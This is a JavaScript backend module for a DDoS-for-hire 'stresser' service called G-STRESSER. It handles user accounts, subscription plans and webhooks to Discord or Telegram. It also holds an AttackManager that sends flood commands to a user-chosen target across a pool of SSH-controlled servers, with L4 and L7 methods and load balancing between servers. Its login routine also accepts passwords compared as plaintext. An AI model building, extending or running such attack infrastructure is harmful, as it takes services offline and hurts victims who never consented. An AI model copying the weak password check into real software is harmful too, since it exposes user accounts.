const fs = require('fs');
const path = require('path');
const { Client } = require('ssh2');
const { exec } = require('child_process');
const bcrypt = require('bcryptjs');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

class WebhookManager {
    static async notify(data) {
        const config = DataManager.read('settings.json');
        if (!config || !config.webhookUrl) return;

        let payload;
        const isDiscord = config.webhookUrl.includes('discord.com/api/webhooks');

        if (typeof data === 'string') {
            payload = isDiscord ? { content: data } : { text: data };
        } else {
            if (isDiscord) {
                payload = {
                    embeds: [{
                        title: data.title || "G-STRESSER SYSTEM",
                        description: data.description || "",
                        color: data.color || 0x00ff9d, // Default Neon Green
                        fields: data.fields || [],
                        footer: {
                            text: data.footer || `G-STRESSER HUB • ${new Date().toLocaleString()}`,
                            icon_url: "https://stress.vpsgen.com/assets/img/favicon.png"
                        },
                        thumbnail: { url: "https://stress.vpsgen.com/assets/img/logo.png" },
                        author: {
                            name: "NETWORK COMMAND CENTER",
                            icon_url: "https://stress.vpsgen.com/assets/img/favicon.png"
                        }
                    }]
                };
            } else {
                // Telegram HTML fallback
                let text = `<b>${data.title || "G-STRESSER"}</b>\n\n${data.description || ""}\n`;
                if (data.fields) {
                    data.fields.forEach(f => {
                        text += `\n<b>${f.name}:</b> ${f.value}`;
                    });
                }
                payload = { text, parse_mode: 'HTML' };
            }
        }

        try {
            await axios.post(config.webhookUrl, payload);
        } catch (e) {
            console.error('Webhook failed:', e.message);
        }
    }
}

class DataManager {
    static read(filename) {
        try {
            const data = fs.readFileSync(path.join(__dirname, 'database', filename), 'utf8');
            return JSON.parse(data);
        } catch (e) {
            return [];
        }
    }

    static write(filename, data) {
        try {
            fs.writeFileSync(path.join(__dirname, 'database', filename), JSON.stringify(data || [], null, 4));
        } catch (e) {
            console.error(`Failed to write database/${filename}:`, e.message);
        }
    }
}

class AuthManager {
    static hashPassword(password) {
        return bcrypt.hashSync(password, 10);
    }

    static generateApiKey() {
        return 'gst-' + uuidv4().replace(/-/g, '').substring(0, 32);
    }

    static migrateKeys() {
        const users = DataManager.read('users.json');
        let changed = false;
        users.forEach(u => {
            if (!u.apiKey) {
                u.apiKey = this.generateApiKey();
                changed = true;
            }
        });
        if (changed) DataManager.write('users.json', users);
    }

    static login(username, password) {
        const users = DataManager.read('users.json');
        const user = users.find(u => u.username === username);
        const passSafe = password || "";
        const userPassSafe = user ? (user.password || "") : "";

        // Prevent bcrypt error if strings are empty or invalid
        let isMatch = false;
        try {
            isMatch = (passSafe === userPassSafe) || (passSafe && userPassSafe && bcrypt.compareSync(passSafe, userPassSafe));
        } catch (e) { }

        if (user && isMatch) {
            const isLifetime = user.expiration === 'Lifetime' || user.expiration === 'Never';
            if (!isLifetime && user.expiration && new Date(user.expiration) < new Date()) {
                return { error: true, message: "Account expired!" };
            }
            return { error: false, user };
        }
        return { error: true, message: "Invalid credentials!" };
    }

    static validate(username, password) {
        const users = DataManager.read('users.json');
        const user = users.find(u => u.username === username);
        if (!user || !password) return null;

        const userPassSafe = user.password || "";
        let isMatch = false;
        try {
            isMatch = (password === userPassSafe || bcrypt.compareSync(password, userPassSafe));
        } catch (e) { }

        if (isMatch) {
            const { password: _, ...userSafe } = user;
            return userSafe;
        }
        return null;
    }

    static getUser(username) {
        const users = DataManager.read('users.json');
        const user = users.find(u => u.username === username);
        if (!user) return null;
        const { password: _, ...userSafe } = user;
        return userSafe;
    }

    static getUserByTelegramId(telegramId) {
        const users = DataManager.read('users.json');
        const user = users.find(u => u.telegramId === telegramId.toString());
        if (!user) return null;
        const { password: _, ...userSafe } = user;
        return userSafe;
    }
    static updateProfile(username, updates) {
        const users = DataManager.read('users.json');
        const userIdx = users.findIndex(u => u.username === username);
        if (userIdx === -1) return { error: true, message: "User not found!" };

        const user = users[userIdx];

        // Password Update logic
        if (updates.newPassword) {
            const curPass = updates.currentPassword || "";
            const userPass = user.password || "";
            let isMatch = false;
            try {
                isMatch = (curPass === userPass) || (curPass && userPass && bcrypt.compareSync(curPass, userPass));
            } catch (e) { }

            if (!isMatch) return { error: true, message: "Current password incorrect!" };
            users[userIdx].password = this.hashPassword(updates.newPassword);
        }

        // Telegram ID Update logic
        if (updates.telegramId !== undefined) {
            users[userIdx].telegramId = updates.telegramId.toString();
        }

        DataManager.write('users.json', users);
        return { error: false, message: "Profile updated successfully!" };
    }

    static regenApiKey(username) {
        const users = DataManager.read('users.json');
        const userIdx = users.findIndex(u => u.username === username);
        if (userIdx === -1) return { error: true, message: "User not found!" };

        const newKey = this.generateApiKey();
        users[userIdx].apiKey = newKey;
        DataManager.write('users.json', users);
        return { error: false, apiKey: newKey };
    }

    static register(username, password, telegramId) {
        const users = DataManager.read('users.json');
        if (users.some(u => u.username === username)) {
            return { error: true, message: "Username already exists!" };
        }

        users.push({
            username,
            password: this.hashPassword(password),
            plan: "Free",
            expiration: "Lifetime",
            apiKey: this.generateApiKey(),
            telegramId: telegramId ? telegramId.toString() : ""
        });

        DataManager.write('users.json', users);
        return { error: false, message: "Registration successful!" };
    }
}

class SSHManager {
    static async execute(server, command, timeout = 30000, silent = false) {
        if (process.env.MOCK_SSH === 'true') {
            if (!silent) {
                const logMsg = `[${new Date().toISOString()}] [MOCK-SSH] ${server.name} (${server.host}): ${command}\n`;
                fs.appendFileSync(path.join(__dirname, 'logs', 'ssh_manager.log'), logMsg);
            }
            return "Mock Output OK";
        }

        // --- LOCAL LOOPBACK BYPASS ---
        if (server.isLocal) {
            return new Promise((resolve, reject) => {
                if (!silent) {
                    const logMsg = `[${new Date().toISOString()}] [LOCAL] Executing on ${server.name}: ${command}\n`;
                    fs.appendFileSync(path.join(__dirname, 'logs', 'ssh_manager.log'), logMsg);
                }
                exec(command, { timeout }, (error, stdout, stderr) => {
                    if (error && !silent) {
                        const failMsg = `[${new Date().toISOString()}] [LOCAL-FAIL] ${server.name}: ${error.message}\n`;
                        fs.appendFileSync(path.join(__dirname, 'logs', 'ssh_manager.log'), failMsg);
                    }
                    resolve(stdout || stderr);
                });
            });
        }

        let lastError = null;
        for (let i = 0; i < 3; i++) {
            try {
                return await new Promise((resolve, reject) => {
                    if (!silent) {
                        const logMsg = `[${new Date().toISOString()}] [SSH] Executing on ${server.name} (${server.host}) [Attempt ${i + 1}]: ${command}\n`;
                        fs.appendFileSync(path.join(__dirname, 'logs', 'ssh_manager.log'), logMsg);
                    }

                    const conn = new Client();
                    const tm = setTimeout(() => {
                        conn.destroy();
                        reject(new Error("SSH Execution Timeout"));
                    }, timeout + 5000);

                    conn.on('ready', () => {
                        conn.exec(command, (err, stream) => {
                            if (err) {
                                clearTimeout(tm);
                                conn.end();
                                return reject(err);
                            }
                            let out = '';
                            stream.on('close', (code, signal) => {
                                clearTimeout(tm);
                                conn.end();
                                resolve(out);
                            }).on('data', (data) => {
                                out += data;
                            }).on('error', (err) => {
                                clearTimeout(tm);
                                conn.end();
                                reject(err);
                            });
                        });
                    }).on('error', (err) => {
                        clearTimeout(tm);
                        reject(err);
                    }).connect({
                        host: server.host,
                        port: server.port || 22,
                        username: server.user,
                        password: server.pass,
                        readyTimeout: 10000,
                        keepaliveInterval: 5000,
                        ident: 'OpenSSH_8.2p1 Ubuntu-4ubuntu0.5'
                    });
                });
            } catch (err) {
                lastError = err;
                const failMsg = `[${new Date().toISOString()}] [SSH-RETRY] ${server.name} attempt ${i + 1} failed: ${err.message}\n`;
                fs.appendFileSync(path.join(__dirname, 'logs', 'ssh_manager.log'), failMsg);
                if (i < 2) await new Promise(r => setTimeout(r, 1000)); // Wait 1s before retry
            }
        }
        throw lastError;
    }

    static async uploadFile(server, localPath, remotePath) {
        if (process.env.MOCK_SSH === 'true') {
            fs.appendFileSync(path.join(__dirname, 'logs', 'ssh_manager.log'), `[MOCK-SFTP] Uploading to ${server.name}: ${localPath} -> ${remotePath}\n`);
            return;
        }

        // --- LOCAL LOOPBACK BYPASS ---
        if (server.isLocal) {
            try {
                fs.copyFileSync(localPath, remotePath);
                return;
            } catch (err) {
                console.error("Local upload bypass failed:", err.message);
                // Fall back to SSH/SFTP if local copy fails
            }
        }

        return new Promise((resolve, reject) => {
            const conn = new Client();
            const tm = setTimeout(() => {
                conn.destroy();
                reject(new Error("SFTP Connection Timeout (15s)"));
            }, 15000);

            conn.on('ready', () => {
                conn.sftp((err, sftp) => {
                    if (err) {
                        clearTimeout(tm);
                        conn.end();
                        return reject(err);
                    }
                    sftp.fastPut(localPath, remotePath, (err) => {
                        clearTimeout(tm);
                        conn.end();
                        if (err) return reject(err);
                        resolve();
                    });
                });
            }).on('error', (err) => {
                clearTimeout(tm);
                reject(err);
            }).connect({
                host: server.host,
                port: server.port || 22,
                username: server.user,
                password: server.pass,
                readyTimeout: 10000,
                keepaliveInterval: 5000
            });
        });
    }

    static async checkResources(server) {
        if (server.isLocal || process.env.MOCK_SSH === 'true') {
            return { cpu: Math.floor(Math.random() * 30), ram: Math.floor(Math.random() * 40) };
        }
        try {
            // Faster /proc based commands. For CPU, we need the delta.
            const cpuCmd = "read cpu user nice system idle iowait irq softirq steal guest guest_nice < /proc/stat; prev_idle=$idle; prev_total=$(($user+$nice+$system+$idle+$iowait+$irq+$softirq+$steal)); sleep 0.5; read cpu user nice system idle iowait irq softirq steal guest guest_nice < /proc/stat; idle=$idle; total=$(($user+$nice+$system+$idle+$iowait+$irq+$softirq+$steal)); diff_idle=$(($idle-$prev_idle)); diff_total=$(($total-$prev_total)); echo $(($diff_total==0 ? 0 : 100 * ($diff_total - $diff_idle) / $diff_total))";
            const ramCmd = "cat /proc/meminfo | grep -E 'MemTotal|MemAvailable'";

            const [cpuStat, memInfo] = await Promise.all([
                this.execute(server, cpuCmd, 5000, true).catch(() => "0"),
                this.execute(server, ramCmd, 5000, true).catch(() => "")
            ]);

            // CPU calculation provided direct from bash script
            let cpu = parseInt(cpuStat) || 0;

            // RAM calculation: (Total - Available) / Total
            let ram = 0;
            if (memInfo) {
                const totalMatch = memInfo.match(/MemTotal:\s+(\d+)/);
                const availMatch = memInfo.match(/MemAvailable:\s+(\d+)/);
                if (totalMatch && availMatch) {
                    const total = parseInt(totalMatch[1]);
                    const avail = parseInt(availMatch[1]);
                    ram = Math.round(((total - avail) / total) * 100);
                }
            }

            return {
                cpu: Math.max(0, Math.min(100, cpu)),
                ram: Math.max(0, Math.min(100, ram))
            };
        } catch (e) {
            const logMsg = `[${new Date().toISOString()}] Failed to check resources for ${server.name}: ${e.message}\n`;
            fs.appendFileSync(path.join(__dirname, 'logs', 'ssh_manager.log'), logMsg);
            return { cpu: 100, ram: 100 };
        }
    }
}

class AttackManager {
    static resourceCache = {}; // { serverId: { cpu, ram, timestamp } }

    static async startAttack(user, attack, method, vpsCount) {
        const methods = DataManager.read('methods.json');
        let methodConfig = null;
        for (let group in methods) {
            if (methods[group][method]) {
                methodConfig = methods[group][method];
                break;
            }
        }
        if (!methodConfig || methodConfig.status === 'offline') {
            throw new Error(`Phương thức ${method} hiện đang bảo trì hoặc bị vô hiệu hóa!`);
        }

        // Determine how many servers to use (up to user's plan limits)
        const plans = DataManager.read('plans.json');
        const userPlan = plans[user.plan] || plans['Free'];
        const serverCount = vpsCount || userPlan.concurrents || 1;

        const servers = DataManager.read('servers.json');
        const availableServers = servers.filter(s => s.status === 'online' && (s.ongoing || 0) < (s.slots || 10));

        if (availableServers.length < serverCount) {
            // Notify via webhook (Discord/Telegram) that servers are low on available slots
            try {
                await WebhookManager.notify({
                    title: 'SERVER CAPACITY ALERT',
                    description: `Không đủ server trống! Cần ${serverCount} server nhưng chỉ còn ${availableServers.length} server có slot trống.`,
                    fields: [
                        { name: 'Required', value: String(serverCount) },
                        { name: 'Available', value: String(availableServers.length) }
                    ],
                    color: 0xFF4500
                });
            } catch (e) {
                console.error('Failed to send capacity alert webhook:', e.message);
            }

            throw new Error(`Không đủ server trống! Cần ${serverCount} server nhưng chỉ còn ${availableServers.length} server có slot trống.`);
        }

        // Layer 4 specific: Strip http/https protocols if not Layer 7
        let processedHost = attack.host;
        const upperMethod = method.toUpperCase();
        const isL7 = ['HTTP', 'HTTPS', 'GET', 'POST', 'TLS', 'BROWSER', 'CF', 'SKYPE', 'OVH', 'FLOOD'].some(m => upperMethod.includes(m));

        if (!isL7) {
            processedHost = attack.host.replace(/(^\w+:|^)\/\//, '');
        }

        // Picking top N servers based on plan (Balanced Load)
        const serverStats = availableServers.map(s => {
            const cache = this.resourceCache[s.id] || { cpu: 10, ram: 10 };
            const ongoingFactor = (s.ongoing || 0) * 10;
            return { ...s, score: (cache.cpu + cache.ram) / 2 + ongoingFactor };
        });

        serverStats.sort((a, b) => a.score - b.score);
        const selectedServers = serverStats.slice(0, serverCount);
        const usedServersInfo = [];

        for (const selectedServer of selectedServers) {
            // Replace placeholder in command if needed
            const finalCommand = attack.command.replace(attack.host, processedHost);

            // Send command with 10s handshake timeout
            SSHManager.execute(selectedServer, finalCommand, 10000).catch(err => {
                const logMsg = `[${new Date().toISOString()}] [Background] Attack ${attack.id} failed on ${selectedServer.name}: ${err.message}\n`;
                fs.appendFileSync(path.join(__dirname, 'logs', 'ssh_manager.log'), logMsg);
            });

            // Update server stats in memory
            const sIndex = servers.findIndex(s => s.id === selectedServer.id);
            if (sIndex !== -1) {
                servers[sIndex].ongoing = (servers[sIndex].ongoing || 0) + 1;
                usedServersInfo.push({ id: selectedServer.id, name: selectedServer.name });
            }
        }

        DataManager.write('servers.json', servers);
        return usedServersInfo; // Return array of servers used
    }

    static async stopAttack(attackID, serverIds) {
        if (!serverIds) return;
        if (!Array.isArray(serverIds)) serverIds = [serverIds];

        let servers = DataManager.read('servers.json');

        for (const sid of serverIds) {
            const index = servers.findIndex(s => s.id === sid);
            if (index === -1) continue;

            const command = `screen -S ${attackID} -X quit`;
            SSHManager.execute(servers[index], command, 5000).catch(() => { });

            servers[index].ongoing = Math.max(0, (servers[index].ongoing || 0) - 1);
        }
        DataManager.write('servers.json', servers);
    }

    static monitorServers() {
        console.log("[Monitor] Starting server resource monitoring loop...");
        setInterval(async () => {
            const servers = DataManager.read('servers.json');
            if (!servers) return;
            for (const s of servers) {
                if (s.status === 'online') {
                    SSHManager.checkResources(s).then(stats => {
                        this.resourceCache[s.id] = { ...stats, timestamp: Date.now() };
                        if (stats.cpu === 100 && stats.ram === 100) {
                            console.warn(`[Monitor] Resource check failed for ${s.name} (returned 100/100 fallback)`);
                        }
                    }).catch(err => {
                        console.error(`[Monitor] Error checking ${s.name}:`, err.message);
                    });
                }
            }
        }, 500);
    }
}

// Start background monitor
AttackManager.monitorServers();

module.exports = { DataManager, AuthManager, SSHManager, AttackManager, WebhookManager };
